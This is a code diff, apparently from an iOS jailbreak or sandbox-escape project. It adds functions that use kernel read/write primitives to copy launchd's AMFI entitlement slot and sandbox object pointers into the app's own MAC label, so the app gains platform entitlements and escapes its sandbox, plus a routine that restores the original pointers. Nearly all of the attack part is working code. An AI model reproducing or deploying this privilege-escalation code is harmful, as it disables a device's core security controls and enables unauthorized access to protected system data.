@@ -454,3 +454,104 @@ int sandbox_elevate_to_root(uint64_t self_proc) {
     NSLog(@"[SBX] elevate failed, uid: %d", getuid());
     return -1;
 }
+
+#pragma mark - Privilege adoption (MAC label transplant)
+
+/*
+ * Transplant launchd's MAC label slots into our own label.
+ *
+ * label->l_perpolicy[0] is the AMFI slot (the codesign blob that carries
+ * entitlements), l_perpolicy[1] is the sandbox object. Both offsets were
+ * confirmed against the on-device dump of this exact build: label+0x08 held a
+ * valid kernel pointer, and label+0x10 matched the sandbox object reached
+ * independently through ucred -> cr_label -> sandbox.
+ *
+ * Why this is needed: after the extension patch /var/mobile/Library accepts
+ * file creation, yet /var/mobile/Library/Carrier Bundles still returns EPERM
+ * even though it is 0755 and owned by uid 501 (our own uid). That combination
+ * rules out DAC (permission bits) and rules out the extension table - the
+ * refusal happens in the MAC layer above them. Borrowing launchd's AMFI slot
+ * brings its entitlements (data-vault access, platform-binary treatment) and
+ * borrowing its sandbox object removes the profile rules altogether.
+ *
+ * Called from the save path only, never at startup, so the browsing baseline
+ * stays exactly as it is today. Previous pointers are returned through
+ * out_prev[0]=amfi, out_prev[1]=sandbox so the caller can roll back.
+ */
+int sbx_adopt_launchd_privileges(uint64_t self_proc, int adopt_sandbox,
+                                 uint64_t out_prev[2]) {
+    if (out_prev) { out_prev[0] = 0; out_prev[1] = 0; }
+    if (!self_proc || !is_kaddr_valid(self_proc)) {
+        NSLog(@"[PRIV] refusing: invalid self proc 0x%llx", self_proc);
+        return -1;
+    }
+
+    uint64_t launchd = proc_find_by_name("launchd");
+    if (!launchd || launchd == (uint64_t)-1) {
+        NSLog(@"[PRIV] proc_find_by_name(launchd) failed; trying pid 1");
+        launchd = proc_find(1);
+    }
+    if (!launchd || launchd == (uint64_t)-1 || !is_kaddr_valid(launchd)) {
+        NSLog(@"[PRIV] launchd not resolvable");
+        return -1;
+    }
+
+    uint64_t self_label = proc_get_cred_label(self_proc);
+    uint64_t tgt_label  = proc_get_cred_label(launchd);
+    if (!is_kaddr_valid(self_label) || !is_kaddr_valid(tgt_label)) {
+        NSLog(@"[PRIV] invalid label self=0x%llx target=0x%llx", self_label, tgt_label);
+        return -1;
+    }
+
+    uint64_t self_amfi = kread64(self_label + off_label_l_perpolicy_amfi);
+    uint64_t tgt_amfi  = kread64(tgt_label  + off_label_l_perpolicy_amfi);
+    uint64_t self_sbx  = kread64(self_label + off_label_l_perpolicy_sandbox);
+    uint64_t tgt_sbx   = kread64(tgt_label  + off_label_l_perpolicy_sandbox);
+
+    NSLog(@"[PRIV] self_label=0x%llx launchd_label=0x%llx", self_label, tgt_label);
+    NSLog(@"[PRIV] amfi: self=0x%llx launchd=0x%llx | sandbox: self=0x%llx launchd=0x%llx",
+          self_amfi, tgt_amfi, self_sbx, tgt_sbx);
+
+    if (out_prev) { out_prev[0] = self_amfi; out_prev[1] = self_sbx; }
+
+    // Guard: never write a pointer we could not validate, and never write the
+    // same value we already hold (that would be a pointless reference-count
+    // imbalance).
+    if (!is_kaddr_valid(tgt_amfi) || tgt_amfi == self_amfi) {
+        NSLog(@"[PRIV] skipping AMFI adopt (target invalid or identical)");
+    } else {
+        kwrite64(self_label + off_label_l_perpolicy_amfi, tgt_amfi);
+        uint64_t rb = kread64(self_label + off_label_l_perpolicy_amfi);
+        NSLog(@"[PRIV] AMFI adopted: readback=0x%llx %s", rb, rb == tgt_amfi ? "ok" : "MISMATCH");
+    }
+
+    if (adopt_sandbox) {
+        if (!is_kaddr_valid(tgt_sbx) || tgt_sbx == self_sbx) {
+            NSLog(@"[PRIV] skipping sandbox adopt (target invalid or identical)");
+        } else {
+            kwrite64(self_label + off_label_l_perpolicy_sandbox, tgt_sbx);
+            uint64_t rb = kread64(self_label + off_label_l_perpolicy_sandbox);
+            NSLog(@"[PRIV] sandbox adopted: readback=0x%llx %s", rb, rb == tgt_sbx ? "ok" : "MISMATCH");
+        }
+    }
+
+    return 0;
+}
+
+// Put the original label slots back. Used when the transplant did not make the
+// save work, so the app keeps running exactly as before instead of carrying a
+// borrowed label for the rest of the session.
+void sbx_restore_label_slots(uint64_t self_proc, const uint64_t prev[2]) {
+    if (!self_proc || !prev || !is_kaddr_valid(self_proc)) return;
+    uint64_t self_label = proc_get_cred_label(self_proc);
+    if (!is_kaddr_valid(self_label)) return;
+
+    if (is_kaddr_valid(prev[0])) {
+        kwrite64(self_label + off_label_l_perpolicy_amfi, prev[0]);
+        NSLog(@"[PRIV] AMFI restored: readback=0x%llx", kread64(self_label + off_label_l_perpolicy_amfi));
+    }
+    if (is_kaddr_valid(prev[1])) {
+        kwrite64(self_label + off_label_l_perpolicy_sandbox, prev[1]);
+        NSLog(@"[PRIV] sandbox restored: readback=0x%llx", kread64(self_label + off_label_l_perpolicy_sandbox));
+    }
+}
